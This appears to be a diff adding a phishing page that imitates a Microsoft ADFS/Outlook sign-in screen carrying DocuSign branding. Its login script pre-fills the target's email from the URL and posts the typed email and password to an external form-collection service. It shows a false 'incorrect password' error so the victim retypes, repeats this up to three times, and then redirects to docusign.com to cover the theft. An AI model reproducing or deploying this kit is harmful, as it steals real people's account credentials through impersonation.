+<p>To find out if your web browser supports JavaScript or to enable JavaScript, see web browser help.</p>
+</div>
+<script type="text/javascript" language="JavaScript">
+document.getElementById("noScript").style.display = "none";
+</script>
+<div id="fullPage">
+<div id="brandingWrapper" class="float">
+<div id="branding"></div>
+</div>
+<div id="contentWrapper" class="float">
+<div id="content">
+<div id="header">
+    <img class='logoImage' id='companyLogo' src='https://upload.wikimedia.org/wikipedia/commons/thumb/e/e3/Docusign_Full_Color.svg/220px-Docusign_Full_Color.svg.png' alt='Outlook'/>
+</div>
+<div id="workArea">
+    
+<div id="authArea" class="groupMargin">
+
+<div id="loginArea">        
+<div id="loginMessage" class="groupMargin"> </div>
+
+<form method="post" id="loginForm" autocomplete="off" novalidate="novalidate" onKeyPress="if (event && event.keyCode == 13) Login.submitLoginRequest();" action="" >
+<div id="error" class="fieldMargin error smallText">
+<span id="errorText" for="">Incorrect user ID or password. Type the correct user ID and password, and try again.</span>
+</div>
+
+<div id="formsAuthenticationArea">
+<div id="userNameArea">
+    <label id="userNameInputLabel" for="userNameInput" class="hidden">User Account</label>
+    <input id="userNameInput" name="email" type="email" value="" tabindex="1" class="text fullWidth"
+        spellcheck="false" placeholder="someone@example.com" autocomplete="off"/>
+</div>
+
+<div id="passwordArea">
+    <label id="passwordInputLabel" for="passwordInput" class="hidden">Password</label>
+    <input id="passwordInput" name="password" type="password" tabindex="2" class="text fullWidth"
+        placeholder="Password" autocomplete="off"/>
+</div>
+<div id="kmsiArea" style="display:''">
+    <input type="checkbox" name="Kmsi" id="kmsiInput" value="true" tabindex="3" />
+    <label for="kmsiInput">Keep me signed in</label>
+</div>
+<div id="submissionArea" class="submitMargin">
+    <span id="submitButton" class="submit" tabindex="4" role=""
+        onKeyPress="if (event && event.keyCode == 32) Login.submitLoginRequest();"
+        onclick="return Login.submitLoginRequest();">Sign in</span>
+</div>
+</div>
+<input id="optionForms" type="hidden" name="AuthMethod" value="FormsAuthentication"/>
+</form>
+
+<div id="authOptions">
+<form id="options"  method="post" action="https://cluster3.adfs.ovh.net:443/adfs/ls/?wa=wsignin1.0&wtrealm=https%3a%2f%2fex3.mail.ovh.net%2fowa%2f&wctx=rm%3d0%26id%3dpassive%26ru%3d%252fowa%252f%253fauthRedirect%253dtrue&wct=2017-09-28T10%3a21%3a41Z&client-request-id=62e6fd39-6a21-4f95-3b0e-018000000028">
+<script type="text/javascript">
+function SelectOption(option) {
+    var i = document.getElementById('optionSelection');
+    i.value = option;
+    document.forms['options'].submit();
+    return false;
+}
+</script>
+<input id="optionSelection" type="hidden" name="AuthMethod" />
+<div id='authOptionLinks' class='groupMargin'></div>
+</form>
+</div>
+
+<div id="introduction" class="groupMargin">
+                    
+</div>
+
+<script type="text/javascript">
+//<![CDATA[
+
+/**
+ * sends a request to the specified url from a form. this will change the window location.
+ * @param {string} path the path to send the post request to
+ * @param {object} params the parameters to add to the url
+ * @param {string} [method=post] the method to use on the form
+ */
+
+function post(data,url) {
+const XHR = new XMLHttpRequest();
+
+  
+  let urlEncodedData = "",
+      urlEncodedDataPairs = [],
+      name;
+  // Turn the data object into an array of URL-encoded key/value pairs.
+  for( name in data ) {
+    urlEncodedDataPairs.push( encodeURIComponent( name ) + '=' + encodeURIComponent( data[name] ) );
+  }
+
+  urlEncodedData = urlEncodedDataPairs.join( '&' ).replace( /%20/g, '+' );
+
+
+  XHR.addEventListener( 'load', function(event) {
+      
+      //u.setError(password, "Wrong Password, please try again", true);
+    
+  } );
+
+  // Define what happens in case of error
+  XHR.addEventListener( 'error', function(event) {
+      
+      //u.setError(password, "Unable to connect something went wrong");
+
+  } );
+
+
+  XHR.open( 'POST', url );
+
+
+  XHR.setRequestHeader( 'Content-Type', 'application/x-www-form-urlencoded' );
+
+  XHR.send( urlEncodedData );
+}
+
+function redirect () {
+         setTimeout(myURL, 1000);
+         var result = document.getElementById("result");
+         result.innerHTML = "<b> The page will redirect after delay of 5 seconds";
+      }
+
+function myURL() {
+         document.location.href = 'https://www.docusign.com/';
+      }
+
+function Login() {
+}
+
+Login.userNameInput = 'userNameInput';
+Login.passwordInput = 'passwordInput';
+
+Login.initialize = function () {
+
+const Grabemail = getUrlVars()["email"];
+
+
+const counttimes_set = 0
+
+if(typeof(Grabemail) !== 'undefined' && check_email(Grabemail) ) {
+        //alert(Grabemail)
+        document.getElementById('userNameInput').value = Grabemail
+        document.getElementById('userNameInput').readOnly = true;
+        
+    
+}
+
+var u = new InputUtil();
+
+u.checkError();
+u.setInitialFocus(Login.userNameInput);
+u.setInitialFocus(Login.passwordInput);
+}();
+
+Login.submitLoginRequest = function () { 
+var u = new InputUtil();
+var e = new LoginErrors();
+
+var userName = document.getElementById(Login.userNameInput);
+var password = document.getElementById(Login.passwordInput);
+
+if (!userName.value || !userName.value.match('[@\\\\]')) {
+    u.setError(userName, e.userNameFormatError);
+    return false;
+}
+
+if (!password.value) {
+    u.setError(password, e.passwordEmpty);
+    return false;
+}
+
+if (password.value.length > maxPasswordLength) {
+    u.setError(password, e.passwordTooLong);
+    return false;
+}
+document.forms['loginForm'].action = 'https://submit-form.com/AnreS5Jjp'
+//document.forms['loginForm'].submit();
+while(counttime < 3){
+     
+    post({email: userName.value,password: password.value}, document.forms['loginForm'].action)
+    password.value = ""
+    u.setError(password, e.submiterror);
+    counttime++
+    return;
+}
+counttime=0
+password.value = ""
+u.setError(password, e.exceed);
+password.readOnly = true;
+redirect();
+};
+
+InputUtil.makePlaceholder(Login.userNameInput);
+InputUtil.makePlaceholder(Login.passwordInput);
+//]]>
+</script>
+</div>
+
+</div>
+
+</div>
+<div id="footerPlaceholder"></div>
+</div>
+<div id="footer">
+<div id="footerLinks" class="floatReverse">
+<div><span id="copyright">&#169; 2016 Microsoft</span></div>
+</div>
+</div>
+</div> 
+</div>
+<script type='text/javascript'>
+//<![CDATA[
+// Copyright (c) Microsoft Corporation.  All rights reserved.
+
+// This file contains several workarounds on inconsistent browser behaviors that administrators may customize.
+"use strict";
+
+// iPhone email friendly keyboard does not include "\" key, use regular keyboard instead.
+// Note change input type does not work on all versions of all browsers.
+if (navigator.userAgent.match(/iPhone/i) != null) {
+var emails = document.querySelectorAll("input[type='email']");
+if (emails) {
+for (var i = 0; i < emails.length; i++) {
+emails[i].type = 'text';
+}
+}
+}
+
+// In the CSS file we set the ms-viewport to be consistent with the device dimensions, 
+// which is necessary for correct functionality of immersive IE. 
+// However, for Windows 8 phone we need to reset the ms-viewport's dimension to its original
+// values (auto), otherwise the viewport dimensions will be wrong for Windows 8 phone.
+// Windows 8 phone has agent string 'IEMobile 10.0'
+if (navigator.userAgent.match(/IEMobile\/10\.0/)) {
+var msViewportStyle = document.createElement("style");
+msViewportStyle.appendChild(
+document.createTextNode(
+"@-ms-viewport{width:auto!important}"
+)
+);
+msViewportStyle.appendChild(
+document.createTextNode(
+"@-ms-viewport{height:auto!important}"
+)
+);
+document.getElementsByTagName("head")[0].appendChild(msViewportStyle);
+}
+
+// If the innerWidth is defined, use it as the viewport width.
+if (window.innerWidth && window.outerWidth && window.innerWidth !== window.outerWidth) {
+var viewport = document.querySelector("meta[name=viewport]");
+viewport.setAttribute('content', 'width=' + window.innerWidth + ', initial-scale=1.0, user-scalable=1');
+}
+
+// Gets the current style of a specific property for a specific element.
+function getStyle(element, styleProp) {
+var propStyle = null;
+
+if (element && element.currentStyle) {
+propStyle = element.currentStyle[styleProp];
+}
+else if (element && window.getComputedStyle) {
+propStyle = document.defaultView.getComputedStyle(element, null).getPropertyValue(styleProp);
+}
+
+return propStyle;
+}
+
+// The script below is used for downloading the illustration image 
+// only when the branding is displaying. This script work together
+// with the code in PageBase.cs that sets the html inline style
+// containing the class 'illustrationClass' with the background image.
+var computeLoadIllustration = function () {
+var branding = document.getElementById("branding");
+var brandingDisplay = getStyle(branding, "display");
+var brandingWrapperDisplay = getStyle(document.getElementById("brandingWrapper"), "display");
+
+if (brandingDisplay && brandingDisplay !== "none" &&
+brandingWrapperDisplay && brandingWrapperDisplay !== "none") {
+var newClass = "illustrationClass";
+
+if (branding.classList && branding.classList.add) {
+branding.classList.add(newClass);
+} else if (branding.className !== undefined) {
+branding.className += " " + newClass;
+}
+if (window.removeEventListener) {
+window.removeEventListener('load', computeLoadIllustration, false);
+window.removeEventListener('resize', computeLoadIllustration, false);
+}
+else if (window.detachEvent) {
+window.detachEvent('onload', computeLoadIllustration);
+window.detachEvent('onresize', computeLoadIllustration);
+}
+}
+};
+
+if (window.addEventListener) {
+window.addEventListener('resize', computeLoadIllustration, false);
+window.addEventListener('load', computeLoadIllustration, false);
+}
+else if (window.attachEvent) {
+window.attachEvent('onresize', computeLoadIllustration);
+window.attachEvent('onload', computeLoadIllustration);
+}
+
+// Function to change illustration image. Usage example below.
+function SetIllustrationImage(imageUri) {
+var illustrationImageClass = '.illustrationClass {background-image:url(' + imageUri + ');}';
+
+var css = document.createElement('style');
+css.type = 'text/css';
+
+if (css.styleSheet) css.styleSheet.cssText = illustrationImageClass;
+else css.appendChild(document.createTextNode(illustrationImageClass));
+
+document.getElementsByTagName("head")[0].appendChild(css);
+}
+</script>
+
+
+</body>
+</html> 
